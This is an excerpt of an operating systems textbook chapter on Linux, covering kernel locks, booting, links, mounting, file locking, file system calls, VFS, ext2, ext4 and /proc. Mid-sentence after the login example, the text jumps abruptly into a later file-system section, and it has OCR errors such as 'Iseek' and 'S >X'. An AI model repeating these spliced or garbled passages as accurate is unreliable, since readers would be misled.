Earlier Linux kernels had just one big kernel lock. This proved highly inefficient, particularly on multiprocessor platforms, since it prevented processes on different CPUs from executing kernel code concurrently. Hence, many new synchronization points were introduced at much finer granularity.

Linux provides several types of synchronization variables, both used internally in the kernel, and available to user-level applications and libraries. At the lowest level, Linux provides wrappers around the hardware-supported atomic instructions, via operations such as atomic_set and atomic_read. In addition, since modern hardware reorders memory operations, Linux provides memory barriers. Using operations like rmb and wmb guarantees that all read/write memory operations preceding the barrier call have completed before any subsequent accesses take place.

More commonly used synchronization constructs are the higher-level ones. Threads that do not wish to block (for performance or correctness reasons) use spinlocks and spin read/write locks. The current Linux version implements the so-called "ticket-based" spinlock, which has excellent performance on SMP and
multicore systems. Threads that are allowed to or need to block use constructs like mutexes and semaphores. Linux supports nonblocking calls like mutex_trylock and sem_trywait to determine the status of the synchronization variable without blocking. Other types of synchronization variables, like futexes, completions, "readcopy-update" (RCU) locks, etc., are also supported. Finally, synchronization between the kernel and the code executed by interrupt-handling routines can also be achieved by dynamically disabling and enabling the corresponding interrupts.

### 10.3.5 Booting Linux

Details vary from platform to platform, but in general the following steps represent the boot process. When the computer starts, the BIOS performs Power-On-Self-Test (POST) and initial device discovery and initialization, since the OS' boot process may rely on access to disks, screens, keyboards, and so on. Next, the first sector of the boot disk, the MBR (Master Boot Record), is read into a fixed memory location and executed. This sector contains a small (512-byte) program that loads a standalone program called boot from the boot device, such as a SATA or SCSI disk. The boot program first copies itself to a fixed high-memory address to free up low memory for the operating system.

Once moved, boot reads the root directory of the boot device. To do this, it must understand the file system and directory format, which is the case with some bootloaders such as GRUB (GRand Unified Bootloader). Other popular bootloaders, such as Intel's LILO, do not rely on any specific file system. Instead, they need a block map and low-level addresses, which describe physical sectors, heads, and cylinders, to find the relevant sectors to be loaded.

Then boot reads in the operating system kernel and jumps to it. At this point, it has finished its job and the kernel is running.

The kernel start-up code is written in assembly language and is highly machine dependent. Typical work includes setting up the kernel stack, identifying the CPU type, calculating the amount of RAM present, disabling interrupts, enabling the MMU, and finally calling the C-language main procedure to start the main part of the operating system.

The C code also has considerable initialization to do, but this is more logical than physical. It starts out by allocating a message buffer to help debug boot problems. As initialization proceeds, messages are written here about what is happening, so that they can be fished out after a boot failure by a special diagnostic program. Think of this as the operating system's cockpit flight recorder (the black box investigators look for after a plane crash).

Next the kernel data structures are allocated. Most are of fixed size, but a few, such as the page cache and certain page table structures, depend on the amount of RAM available.

At this point the system begins autoconfiguration. Using configuration files telling what kinds of I/O devices might be present, it begins probing the devices to
see which ones actually are present. If a probed device responds to the probe, it is added to a table of attached devices. If it fails to respond, it is assumed to be absent and ignored henceforth. Unlike traditional UNIX versions, Linux device drivers do not need to be statically linked and may be loaded dynamically (as can be done in all versions of MS-DOS and Windows, incidentally).

The arguments for and against dynamically loading drivers are interesting and worth stating explicitly. The main argument for dynamic loading is that a single binary can be shipped to customers with divergent configurations and have it automatically load the drivers it needs, possibly even over a network. The main argument against dynamic loading is security. If you are running a secure site, such as a bank's database or a corporate Web server, you probably want to make it impossible for anyone to insert random code into the kernel. The system administrator may keep the operating system sources and object files on a secure machine, do all system builds there, and ship the kernel binary to other machines over a local area network. If drivers cannot be loaded dynamically, this scenario prevents machine operators and others who know the superuser password from injecting malicious or buggy code into the kernel. Furthermore, at large sites, the hardware configuration is known exactly at the time the system is compiled and linked. Changes are sufficiently rare that having to relink the system when a new hardware device is added is not an issue.

Once all the hardware has been configured, the next thing to do is to carefully handcraft process 0, set up its stack, and run it. Process 0 continues initialization, doing things like programming the real-time clock, mounting the root file system, and creating init (process 1) and the page daemon (process 2).

Init checks its flags to see if it is supposed to come up single user or multiuser. In the former case, it forks off a process that executes the shell and waits for this process to exit. In the latter case, it forks off a process that executes the system initialization shell script, /etc/rc, which can do file system consistency checks, mount additional file systems, start daemon processes, and so on. Then it reads /etc/ttys, which lists the terminals and some of their properties. For each enabled terminal, it forks off a copy of itself, which does some housekeeping and then executes a program called getty.

Getty sets the line speed and other properties for each line (some of which may be modems, for example), and then displays
login:
on the terminal's screen and tries to read the user's name from the keyboard. When someone sits down at the terminal and provides a login name, getty terminates by executing /bin/login, the login program. Login then asks for a password, encrypts it, and verifies it against the encrypted password stored in the password file, /etc/passwd. If it is correct, login replaces itself with the user's shell, which then waits for the first command. If it is incorrect, login just asks for another user name. This mechanism is shown in Fig. 10-11 for a system with three terminals.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-214_739_1282_218_127.jpg)
Figure 10-11. The sequence of processes used to boot some Linux systems.

In the figure, the getty process running for terminal 0 is still waiting for input. On terminal 1, a user has typed a login name, so getty has overwritten itself with login, which is asking for the password. A successful login has already occurred on terminal 2, causing the shell to type the prompt (\%). The user then typed
```

cp f1 f2

cp chap-10 backup-10

```

has exactly the same effect as the longer command
```

cp /usr/ast/books/mos4/chap-10 /usr/ast/books/mos4/backup-10

```

It frequently occurs that a user needs to refer to a file that belongs to another user, or at least is located elsewhere in the file tree. For example, if two users are sharing a file, it will be located in a directory belonging to one of them, so the other will have to use an absolute path name to refer to it (or change the working directory). If this is long enough, it may become irritating to have to keep typing it. Linux provides a solution by allowing users to make a new directory entry that points to an existing file. Such an entry is called a link.

As an example, consider the situation of Fig. 10-24(a). Fred and Lisa are working together on a project, and each of them needs access to the other's files. If Fred has /usr/fred as his working directory, he can refer to the file $x$ in Lisa's directory as /usr/lisa/x. Alternatively, Fred can create a new entry in his directory, as shown in Fig. 10-24(b), after which he can use $x$ to mean /usr/lisa/x.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-238_564_968_1425_283.jpg)
Figure 10-24. (a) Before linking. (b) After linking.

In the example just discussed, we suggested that before linking, the only way for Fred to refer to Lisa's file $x$ was by using its absolute path. Actually, this is not really true. When a directory is created, two entries, . and .., are automatically made in it. The former refers to the working directory itself. The latter refers to the directory's parent, that is, the directory in which it itself is listed. Thus from /usr/fred, another path to Lisa's file $x$ is ../lisa/ $x$.

In addition to regular files, Linux also supports character special files and block special files. Character special files are used to model serial I/O devices, such as keyboards and printers. Opening and reading from /dev/tty reads from the keyboard; opening and writing to /dev/lp writes to the printer. Block special files, often with names like /dev/hd1, can be used to read and write raw disk partitions without regard to the file system. Thus a seek to byte $k$ followed by a read will begin reading from the $k$ th byte on the corresponding partition, completely ignoring the i-node and file structure. Raw block devices are used for paging and swapping by programs that lay down file systems (e.g., mkfs), and by programs that fix sick file systems (e.g., fsck), for example.

Many computers have two or more disks. On mainframes at banks, for example, it is frequently necessary to have 100 or more disks on a single machine, in order to hold the huge databases required. Even personal computers often have at least two disks-a hard disk and an optical (e.g., DVD) drive. When there are multiple disk drives, the question arises of how to handle them.

One solution is to put a self-contained file system on each one and just keep them separate. Consider, for example, the situation shown in Fig. 10-25(a). Here we have a hard disk, which we call $C$ : and a DVD, which we call $D$ :. Each has its own root directory and files. With this solution, the user has to specify both the device and the file when anything other than the default is needed. For instance, to copy a file $x$ to a directory $d$ (assuming $C$ : is the default), one would type
```

cp D:/x /a/d/x

```

This is the approach taken by a number of systems, including Windows 8, which it inherited from MS-DOS in a century long ago.

The Linux solution is to allow one disk to be mounted in another disk's file tree. In our example, we could mount the DVD on the directory $/ b$, yielding the file system of Fig. 10-25(b). The user now sees a single file tree, and no longer has to be aware of which file resides on which device. The above copy command now becomes
```

cp /b/x /a/d/x

```

exactly the same as it would have been if everything had been on the hard disk in the first place.

Another interesting property of the Linux file system is locking. In some applications, two or more processes may be using the same file at the same time, which may lead to race conditions. One solution is to program the application with

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-240_506_1061_248_236.jpg)
Figure 10-25. (a) Separate file systems. (b) After mounting.

critical regions. However, if the processes belong to independent users who do not even know each other, this kind of coordination is generally inconvenient.

Consider, for example, a database consisting of many files in one or more directories that are accessed by unrelated users. It is certainly possible to associate a semaphore with each directory or file and achieve mutual exclusion by having processes do a down operation on the appropriate semaphore before accessing the data. The disadvantage, however, is that a whole directory or file is then made inaccessible, even though only one record may be needed.

For this reason, POSIX provides a flexible and fine-grained mechanism for processes to lock as little as a single byte and as much as an entire file in one indivisible operation. The locking mechanism requires the caller to specify the file to be locked, the starting byte, and the number of bytes. If the operation succeeds, the system makes a table entry noting that the bytes in question (e.g., a database record) are locked.

Two kinds of locks are provided, shared locks and exclusive locks. If a portion of a file already contains a shared lock, a second attempt to place a shared lock on it is permitted, but an attempt to put an exclusive lock on it will fail. If a portion of a file contains an exclusive lock, all attempts to lock any part of that portion will fail until the lock has been released. In order to successfully place a lock, every byte in the region to be locked must be available.

When placing a lock, a process must specify whether it wants to block or not in the event that the lock cannot be placed. If it chooses to block, when the existing lock has been removed, the process is unblocked and the lock is placed. If the process chooses not to block when it cannot place a lock, the system call returns immediately, with the status code telling whether the lock succeeded or not. If it did not, the caller has to decide what to do next (e.g., wait and try again).

Locked regions may overlap. In Fig. 10-26(a) we see that process $A$ has placed a shared lock on bytes 4 through 7 of some file. Later, process $B$ places a shared
lock on bytes 6 through 9, as shown in Fig. 10-26(b). Finally, $C$ locks bytes 2 through 11. As long as all these locks are shared, they can coexist.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-241_763_1199_327_167.jpg)
Figure 10-26. (a) A file with one lock. (b) Adding a second lock. (c) A third one.

Now consider what happens if a process tries to acquire an exclusive lock to byte 9 of the file of Fig. 10-26(c), with a request to block if the lock fails. Since two previous locks cover this block, the caller will block and will remain blocked until both $B$ and $C$ release their locks.

### 10.6.2 File-System Calls in Linux

Many system calls relate to files and the file system. First we will look at the system calls that operate on individual files. Later we will examine those that involve directories or the file system as a whole. To create a new file, the creat call can be used. (When Ken Thompson was once asked what he would do differently if he had the chance to reinvent UNIX, he replied that he would spell creat as create this time.) The parameters provide the name of the file and the protection mode. Thus
```

fd = creat(“abc”, mode);

```

creates a file called $a b c$ with the protection bits taken from mode. These bits determine which users may access the file and how. They will be described later.

The creat call not only creates a new file, but also opens it for writing. To allow subsequent system calls to access the file, a successful creat returns a small
nonnegative integer called a file descriptor, $f d$ in the example above. If a creat is done on an existing file, that file is truncated to length 0 and its contents are discarded. Files can also be created using the open call with appropriate arguments.

Now let us continue looking at the main file-system calls, which are listed in Fig. 10-27. To read or write an existing file, the file must first be opened by calling open or creat. This call specifies the file name to be opened and how it is to be opened: for reading, writing, or both. Various options can be specified as well. Like creat, the call to open returns a file descriptor that can be used for reading or writing. Afterward, the file can be closed by close, which makes the file descriptor available for reuse on a subsequent creat or open. Both the creat and open calls always return the lowest-numbered file descriptor not currently in use.

When a program starts executing in the standard way, file descriptors 0, 1, and 2 are already opened for standard input, standard output, and standard error, respectively. In this way, a filter, such as the sort program, can just read its input from file descriptor 0 and write its output to file descriptor 1, without having to know what files they are. This mechanism works because the shell arranges for these values to refer to the correct (redirected) files before the program is started.

| System call | Description |
| :--- | :--- |
| fd = creat(name, mode) | One way to create a new file |
| fd = open(file, how, ...) | Open a file for reading, writing, or both |
| s = close(fd) | Close an open file |
| $\mathrm{n}=$ read(fd, buffer, nbytes) | Read data from a file into a buffer |
| $\mathrm{n}=$ write(fd, buffer, nbytes) | Write data from a buffer into a file |
| position = Iseek(fd, offset, whence) | Move the file pointer |
| s = stat(name, \&buf) | Get a file's status information |
| $\mathrm{s}=$ fstat(fd, \&buf) | Get a file's status information |
| s = pipe(\&fd[0]) | Create a pipe |
| $\mathrm{s}=\mathrm{fcntl}(\mathrm{fd}, \mathrm{cmd}, \ldots)$ | File locking and other operations |

Figure 10-27. Some system calls relating to files. The return code $s$ is -1 if an error has occurred; $f d$ is a file descriptor, and position is a file offset. The parameters should be self explanatory.

The most heavily used calls are undoubtedly read and write. Each one has three parameters: a file descriptor (telling which open file to read or write), a buffer address (telling where to put the data or get the data from), and a count (telling how many bytes to transfer). That is all there is. It is a very simple design. A typical call is
n = read(fd, buffer, nbytes);
Although nearly all programs read and write files sequentially, some programs need to be able to access any part of a file at random. Associated with each file is a
pointer that indicates the current position in the file. When reading (or writing) sequentially, it normally points to the next byte to be read (written). If the pointer is at, say, 4096, before 1024 bytes are read, it will automatically be moved to 5120 after a successful read system call. The Iseek call changes the value of the position pointer, so that subsequent calls to read or write can begin anywhere in the file, or even beyond the end of it. It is called Iseek to avoid conflicting with seek, a nowobsolete call that was formerly used on 16-bit computers for seeking.

Lseek has three parameters: the first one is the file descriptor for the file; the second is a file position; the third tells whether the file position is relative to the beginning of the file, the current position, or the end of the file. The value returned by lseek is the absolute position in the file after the file pointer is changed. Slightly ironically, Iseek is the only file system call that never causes a real disk seek because all it does is update the current file position, which is a number in memory.

For each file, Linux keeps track of the file mode (regular, directory, special file), size, time of last modification, and other information. Programs can ask to see this information via the stat system call. The first parameter is the file name. The second is a pointer to a structure where the information requested is to be put. The fields in the structure are shown in Fig. 10-28. The fstat call is the same as stat except that it operates on an open file (whose name may not be known) rather than on a path name.

| Device the file is on |
| :--- |
| I-node number (which file on the device) |
| File mode (includes protection information) |
| Number of links to the file |
| Identity of the file's owner |
| Group the file belongs to |
| File size (in bytes) |
| Creation time |
| Time of last access |
| Time of last modification |

Figure 10-28. The fields returned by the stat system call.

The pipe system call is used to create shell pipelines. It creates a kind of pseudofile, which buffers the data between the pipeline components, and returns file descriptors for both reading and writing the buffer. In a pipeline such as
```

sort <in | head -30

```

file descriptor 1 (standard output) in the process running sort would be set (by the shell) to write to the pipe, and file descriptor 0 (standard input) in the process running head would be set to read from the pipe. In this way, sort just reads from file descriptor 0 (set to the file in) and writes to file descriptor 1 (the pipe) without even
being aware that these have been redirected. If they have not been redirected, sort will automatically read from the keyboard and write to the screen (the default devices). Similarly, when head reads from file descriptor 0, it is reading the data sort put into the pipe buffer without even knowing that a pipe is in use. This is a clear example of how a simple concept (redirection) with a simple implementation (file descriptors 0 and 1) can lead to a powerful tool (connecting programs in arbitrary ways without having to modify them at all).

The last system call in Fig. 10-27 is fcntl. It is used to lock and unlock files, apply shared or exclusive locks, and perform a few other file-specific operations.

Now let us look at some system calls that relate more to directories or the file system as a whole, rather than just to one specific file. Some common ones are listed in Fig. 10-29. Directories are created and destroyed using mkdir and rmdir, respectively. A directory can be removed only if it is empty.

| System call | Description |
| :--- | :--- |
| s = mkdir(path, mode) | Create a new directory |
| s = rmdir(path) | Remove a directory |
| s = link(oldpath, newpath) | Create a link to an existing file |
| s = unlink(path) | Unlink a file |
| s = chdir(path) | Change the working directory |
| dir = opendir(path) | Open a directory for reading |
| s = closedir(dir) | Close a directory |
| dirent = readdir(dir) | Read one directory entry |
| rewinddir(dir) | Rewind a directory so it can be reread |

Figure 10-29. Some system calls relating to directories. The return code $s$ is -1 if an error has occurred; dir identifies a directory stream, and dirent is a directory entry. The parameters should be self explanatory.

As we saw in Fig. 10-24, linking to a file creates a new directory entry that points to an existing file. The link system call creates the link. The parameters specify the original and new names, respectively. Directory entries are removed with unlink. When the last link to a file is removed, the file is automatically deleted. For a file that has never been linked, the first unlink causes it to disappear.

The working directory is changed by the chdir system call. Doing so has the effect of changing the interpretation of relative path names.

The last four calls of Fig. 10-29 are for reading directories. They can be opened, closed, and read, analogous to ordinary files. Each call to readdir returns exactly one directory entry in a fixed format. There is no way for users to write in a directory (in order to maintain the integrity of the file system). Files can be added to a directory using creat or link and removed using unlink. There is also no way to seek to a specific file in a directory, but rewinddir allows an open directory to be read again from the beginning.

### 10.6.3 Implementation of the Linux File System

In this section we will first look at the abstractions supported by the Virtual File System layer. The VFS hides from higher-level processes and applications the differences among many types of file systems supported by Linux, whether they are residing on local devices or are stored remotely and need to be accessed over the network. Devices and other special files are also accessed through the VFS layer. Next, we will describe the implementation of the first widespread Linux file system, ext2, or the second extended file system. Afterward, we will discuss the improvements in the ext4 file system. A wide variety of other file systems are also in use. All Linux systems can handle multiple disk partitions, each with a different file system on it.

## The Linux Virtual File System

In order to enable applications to interact with different file systems, implemented on different types of local or remote devices, Linux takes an approach used in other UNIX systems: the Virtual File System (VFS). VFS defines a set of basic file-system abstractions and the operations which are allowed on these abstractions. Invocations of the system calls described in the previous section access the VFS data structures, determine the exact file system where the accessed file belongs, and via function pointers stored in the VFS data structures invoke the corresponding operation in the specified file system.

Figure 10-30 summarizes the four main file-system structures supported by VFS. The superblock contains critical information about the layout of the file system. Destruction of the superblock will render the file system unreadable. The inodes (short for index-nodes, but never called that, although some lazy people drop the hyphen and call them inodes) each describe exactly one file. Note that in Linux, directories and devices are also represented as files, thus they will have corresponding i-nodes. Both superblocks and i-nodes have a corresponding structure maintained on the physical disk where the file system resides.

| Object | Description | Operation |
| :--- | :--- | :--- |
| Superblock | specific file-system | read_inode, sync_fs |
| Dentry | directory entry, single component of a path | create, link |
| I-node | specific file | d_compare, d_delete |
| File | open file associated with a process | read, write |

Figure 10-30. File-system abstractions supported by the VFS.

In order to facilitate certain directory operations and traversals of paths, such as /usr/ast/bin, VFS supports a dentry data structure which represents a directory entry. This data structure is created by the file system on the fly. Directory entries
are cached in what is called the dentry_cache. For instance, the dentry_cache would contain entries for /, /usr, /usr/ast, and the like. If multiple processes access the same file through the same hard link (i.e., same path), their file object will point to the same entry in this cache.

Finally, the file data structure is an in-memory representation of an open file, and is created in response to the open system call. It supports operations such as read, write, sendfile, lock, and other system calls described in the previous section.

The actual file systems implemented underneath the VFS need not use the exact same abstractions and operations internally. They must, however, implement file-system operations semantically equivalent to those specified with the VFS objects. The elements of the operations data structures for each of the four VFS objects are pointers to functions in the underlying file system.

## The Linux Ext2 File System

We next describe one of the most popular on-disk file systems used in Linux: ext2. The first Linux release used the MINIX 1 file system and was limited by short file names and 64-MB file sizes. The MINIX 1 file system was eventually replaced by the first extended file system, ext, which permitted both longer file names and larger file sizes. Due to its performance inefficiencies, ext was replaced by its successor, ext2, which is still in widespread use.

An ext2 Linux disk partition contains a file system with the layout shown in Fig. 10-31. Block 0 is not used by Linux and contains code to boot the computer. Following block 0, the disk partition is divided into groups of blocks, irrespective of where the disk cylinder boundaries fall. Each group is organized as follows.

The first block is the superblock. It contains information about the layout of the file system, including the number of i-nodes, the number of disk blocks, and the start of the list of free disk blocks (typically a few hundred entries). Next comes the group descriptor, which contains information about the location of the bitmaps, the number of free blocks and i-nodes in the group, and the number of directories in the group. This information is important since ext2 attempts to spread directories evenly over the disk.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-246_311_1141_1688_193.jpg)
Figure 10-31. Disk layout of the Linux ext2 file system.

Two bitmaps are used to keep track of the free blocks and free i-nodes, respectively, a choice inherited from the MINIX 1 file system (and in contrast to most UNIX file systems, which use a free list). Each map is one block long. With a 1-KB block, this design limits a block group to 8192 blocks and 8192 i-nodes. The former is a real restriction but, in practice, the latter is not. With 4-KB blocks, the numbers are four times larger.

Following the superblock are the i-nodes themselves. They are numbered from 1 up to some maximum. Each i-node is 128 bytes long and describes exactly one file. An i-node contains accounting information (including all the information returned by stat, which simply takes it from the i-node), as well as enough information to locate all the disk blocks that hold the file's data.

Following the i-nodes are the data blocks. All the files and directories are stored here. If a file or directory consists of more than one block, the blocks need not be contiguous on the disk. In fact, the blocks of a large file are likely to be spread all over the disk.

I-nodes corresponding to directories are dispersed throughout the disk block groups. Ext2 makes an effort to collocate ordinary files in the same block group as the parent directory, and data files in the same block as the original file i-node, provided that there is sufficient space. This idea was borrowed from the Berkeley Fast File System (McKusick et al., 1984). The bitmaps are used to make quick decisions regarding where to allocate new file-system data. When new file blocks are allocated, ext2 also preallocates a number (eight) of additional blocks for that file, so as to minimize the file fragmentation due to future write operations. This scheme balances the file-system load across the entire disk. It also performs well due to its tendencies for collocation and reduced fragmentation.

To access a file, it must first use one of the Linux system calls, such as open, which requires the file's path name. The path name is parsed to extract individual directories. If a relative path is specified, the lookup starts from the process' current directory, otherwise it starts from the root directory. In either case, the i-node for the first directory can easily be located: there is a pointer to it in the process descriptor, or, in the case of a root directory, it is typically stored in a predetermined block on disk.

The directory file allows file names up to 255 characters and is illustrated in Fig. 10-32. Each directory consists of some integral number of disk blocks so that directories can be written atomically to the disk. Within a directory, entries for files and directories are in unsorted order, with each entry directly following the one before it. Entries may not span disk blocks, so often there are some number of unused bytes at the end of each disk block.

Each directory entry in Fig. 10-32 consists of four fixed-length fields and one variable-length field. The first field is the i-node number, 19 for the file colossal, 42 for the file voluminous, and 88 for the directory bigdir. Next comes a field rec_len, telling how big the entry is (in bytes), possibly including some padding after the name. This field is needed to find the next entry for the case that the file

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-248_629_1270_240_135.jpg)
Figure 10-32. (a) A Linux directory with three files. (b) The same directory after the file voluminous has been removed.

name is padded by an unknown length. That is the meaning of the arrow in Fig. 10-32. Then comes the type field: file, directory, and so on. The last fixed field is the length of the actual file name in bytes, 8, 10, and 6 in this example. Finally, comes the file name itself, terminated by a 0 byte and padded out to a 32-bit boundary. Additional padding may follow that.

In Fig. 10-32(b) we see the same directory after the entry for voluminous has been removed. All the removeal has done is increase the size of the total entry field for colossal, turning the former field for voluminous into padding for the first entry. This padding can be used for a subsequent entry, of course.

Since directories are searched linearly, it can take a long time to find an entry at the end of a large directory. Therefore, the system maintains a cache of recently accessed directories. This cache is searched using the name of the file, and if a hit occurs, the costly linear search is avoided. A dentry object is entered in the dentry cache for each of the path components, and, through its i-node, the directory is searched for the subsequent path element entry, until the actual file i-node is reached.

For instance, to look up a file specified with an absolute path name, such as /usr/ast/file, the following steps are required. First, the system locates the root directory, which generally uses i-node 2, especially when i-node 1 is reserved for bad-block handling. It places an entry in the dentry cache for future lookups of the root directory. Then it looks up the string "usr" in the root directory, to get the inode number of the /usr directory, which is also entered in the dentry cache. This inode is then fetched, and the disk blocks are extracted from it, so the /usr directory can be read and searched for the string "ast". Once this entry is found, the i-node
number for the /usr/ast directory can be taken from it. Armed with the i-node number of the /usr/ast directory, this i-node can be read and the directory blocks located. Finally, "file" is looked up and its i-node number found. Thus, the use of a relative path name is not only more convenient for the user, but it also saves a substantial amount of work for the system.

If the file is present, the system extracts the i-node number and uses it as an index into the i-node table (on disk) to locate the corresponding i-node and bring it into memory. The i-node is put in the i-node table, a kernel data structure that holds all the i-nodes for currently open files and directories. The format of the inode entries, as a bare minimum, must contain all the fields returned by the stat system call so as to make stat work (see Fig. 10-28). In Fig. 10-33 we show some of the fields included in the i-node structure supported by the Linux file-system layer. The actual i-node structure contains many more fields, since the same structure is also used to represent directories, devices, and other special files. The inode structure also contains fields reserved for future use. History has shown that unused bits do not remain that way for long.

| Field | Bytes | Description |
| :--- | :--- | :--- |
| Mode | 2 | File type, protection bits, setuid, setgid bits |
| Nlinks | 2 | Number of directory entries pointing to this i-node |
| Uid | 2 | UID of the file owner |
| Gid | 2 | GID of the file owner |
| Size | 4 | File size in bytes |
| Addr | 60 | Address of first 12 disk blocks, then 3 indirect blocks |
| Gen | 1 | Generation number (incremented every time i-node is reused) |
| Atime | 4 | Time the file was last accessed |
| Mtime | 4 | Time the file was last modified |
| Ctime | 4 | Time the i-node was last changed (except the other times) |

Figure 10-33. Some fields in the i-node structure in Linux.

Let us now see how the system reads a file. Remember that a typical call to the library procedure for invoking the read system call looks like this:
```

n = read(fd, buffer, nbytes);

```

When the kernel gets control, all it has to start with are these three parameters and the information in its internal tables relating to the user. One of the items in the internal tables is the file-descriptor array. It is indexed by a file descriptor and contains one entry for each open file (up to the maximum number, usually defaults to 32).

The idea is to start with this file descriptor and end up with the corresponding i-node. Let us consider one possible design: just put a pointer to the i-node in the file-descriptor table. Although simple, unfortunately this method does not work.

The problem is as follows. Associated with every file descriptor is a file position that tells at which byte the next read (or write) will start. Where should it go? One possibility is to put it in the i-node table. However, this approach fails if two or more unrelated processes happen to open the same file at the same time because each one has its own file position.

A second possibility is to put the file position in the file-descriptor table. In that way, every process that opens a file gets its own private file position. Unfortunately this scheme fails too, but the reasoning is more subtle and has to do with the nature of file sharing in Linux. Consider a shell script, $s$, consisting of two commands, $p 1$ and $p 2$, to be run in order. If the shell script is called by the command

S >X
it is expected that $p 1$ will write its output to $x$, and then $p 2$ will write its output to $x$ also, starting at the place where $p 1$ stopped.

When the shell forks off $p 1, x$ is initially empty, so $p 1$ just starts writing at file position 0. However, when $p 1$ finishes, some mechanism is needed to make sure that the initial file position that $p 2$ sees is not 0 (which it would be if the file position were kept in the file-descriptor table), but the value $p 1$ ended with.

The way this is achieved is shown in Fig. 10-34. The trick is to introduce a new table, the open-file-description table, between the file descriptor table and the i-node table, and put the file position (and read/write bit) there. In this figure, the parent is the shell and the child is first $p 1$ and later $p 2$. When the shell forks off p1, its user structure (including the file-descriptor table) is an exact copy of the shell's, so both of them point to the same open-file-description table entry. When p1 finishes, the shell's file descriptor is still pointing to the open-file description containing $p 1$ 's file position. When the shell now forks off $p 2$, the new child automatically inherits the file position, without either it or the shell even having to know what that position is.

However, if an unrelated process opens the file, it gets its own open-file-de-scription entry, with its own file position, which is precisely what is needed. Thus the whole point of the open-file-description table is to allow a parent and child to share a file position, but to provide unrelated processes with their own values.

Getting back to the problem of doing the read, we have now shown how the file position and i-node are located. The i-node contains the disk addresses of the first 12 blocks of the file. If the file position falls in the first 12 blocks, the block is read and the data are copied to the user. For files longer than 12 blocks, a field in the i-node contains the disk address of a single indirect block, as shown in Fig. 10-34. This block contains the disk addresses of more disk blocks. For example, if a block is 1 KB and a disk address is 4 bytes, the single indirect block can hold 256 disk addresses. Thus this scheme works for files of up to 268 KB.

Beyond that, a double indirect block is used. It contains the addresses of 256 single indirect blocks, each of which holds the addresses of 256 data blocks. This mechanism is sufficient to handle files up to $10+2^{16}$ blocks ( $67,119,104$ bytes). If

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-251_994_1230_242_154.jpg)
Figure 10-34. The relation between the file-descriptor table, the open-file-de-scription-table, and the i-node table.

even this is not enough, the i-node has space for a triple indirect block. Its pointers point to many double indirect blocks. This addressing scheme can handle file sizes of $2^{24}$ 1-KB blocks (16 GB). For 8-KB block sizes, the addressing scheme can support file sizes up to 64 TB.

## The Linux Ext4 File System

In order to prevent all data loss after system crashes and power failures, the ext2 file system would have to write out each data block to disk as soon as it was created. The latency incurred during the required disk-head seek operation would be so high that the performance would be intolerable. Therefore, writes are delayed, and changes may not be committed to disk for up to 30 sec, which is a very long time interval in the context of modern computer hardware.

To improve the robustness of the file system, Linux relies on journaling file systems. Ext3, a successor of the ext2 file system, is an example of a journaling file system. Ext4, a follow-on of ext3, is also a journaling file system, but unlike
ext3, it changes the block addressing scheme used by its predecessors, thereby supporting both larger files and larger overall file-system sizes. We will describe some of its features next.

The basic idea behind a journaling file system is to maintain a journal, which describes all file-system operations in sequential order. By sequentially writing out changes to the file-system data or metadata (i-nodes, superblock, etc.), the operations do not suffer from the overheads of disk-head movement during random disk accesses. Eventually, the changes will be written out, committed, to the appropriate disk location, and the corresponding journal entries can be discarded. If a system crash or power failure occurs before the changes are committed, during restart the system will detect that the file system was not unmounted properly, traverse the journal, and apply the file-system changes described in the journal log.

Ext4 is designed to be highly compatible with ext2 and ext3, although its core data structures and disk layout are modified. Regardless, a file system which has been unmounted as an ext2 system can be subsequently mounted as an ext4 system and offer the journaling capability.

The journal is a file managed as a circular buffer. The journal may be stored on the same or a separate device from the main file system. Since the journal operations are not "journaled" themselves, these are not handled by the same ext4 file system. Instead, a separate JBD (Journaling Block Device) is used to perform the journal read/write operations.

JBD supports three main data structures: log record, atomic operation handle, and transaction. A log record describes a low-level file-system operation, typically resulting in changes within a block. Since a system call such as write includes changes at multiple places-i-nodes, existing file blocks, new file blocks, list of free blocks, etc.-related log records are grouped in atomic operations. Ext4 notifies JBD of the start and end of system-call processing, so that JBD can ensure that either all log records in an atomic operation are applied, or none of them. Finally, primarily for efficiency reasons, JBD treats collections of atomic operations as transactions. Log records are stored consecutively within a transaction. JBD will allow portions of the journal file to be discarded only after all log records belonging to a transaction are safely committed to disk.

Since writing out a log entry for each disk change may be costly, ext4 may be configured to keep a journal of all disk changes, or only of changes related to the file-system metadata (the i-nodes, superblocks, etc.). Journaling only metadata gives less system overhead and results in better performance but does not make any guarantees against corruption of file data. Several other journaling file systems maintain logs of only metadata operations (e.g., SGI's XFS). In addition, the reliability of the journal can be further improved via checksumming.

Key modification in ext4 compared to its predecessors is the use of extents. Extents represent contiguous blocks of storage, for instance 128 MB of contiguous 4-KB blocks vs. individual storage blocks, as referenced in ext2. Unlike its predecessors, ext4 does not require metadata operations for each block of storage. This
scheme also reduces fragmentation for large files. As a result, ext4 can provide faster file system operations and support larger files and file system sizes. For instance, for a block size of 1 KB, ext4 increases the maximum file size from 16 GB to 16 TB, and the maximum file system size to 1 EB (Exabyte).

## The /proc File System

Another Linux file system is the /proc (process) file system, an idea originally devised in the 8th edition of UNIX from Bell Labs and later copied in 4.4BSD and System V. However, Linux extends the idea in several ways. The basic concept is that for every process in the system, a directory is created in /proc. The name of the directory is the process PID expressed as a decimal number. For example, /proc/619 is the directory corresponding to the process with PID 619. In this directory are files that appear to contain information about the process, such as its command line, environment strings, and signal masks. In fact, these files do not exist on the disk. When they are read, the system retrieves the information from the actual process as needed and returns it in a standard format.

Many of the Linux extensions relate to other files and directories located in /proc. They contain a wide variety of information about the CPU, disk partitions, devices, interrupt vectors, kernel counters, file systems, loaded modules, and much more. Unprivileged user programs may read much of this information to learn about system behavior in a safe way. Some of these files may be written to in order to change system parameters.

### 10.6.4 NFS: The Network File System

